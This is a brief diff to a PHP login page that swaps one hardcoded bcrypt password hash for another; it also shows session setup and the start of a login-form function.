@@ -1,7 +1,7 @@
 <?php
 session_start();
 
-$secure_password_hash = '$2y$10$M68WNWyTBe3nZtI4Lm.eLer/jUp/YKgD5utOL4UuKOBm9u7d1Aqte'; 
+$secure_password_hash = '$2y$10$2QIkqXrKNEuGdAnW/fJ3E.Yc4AaT6X9MbXBmIiM2DXMKGIWT.MGhy'; 
 $session_key = hash('sha256', $_SERVER['HTTP_HOST']);
 
 function show_login_form()
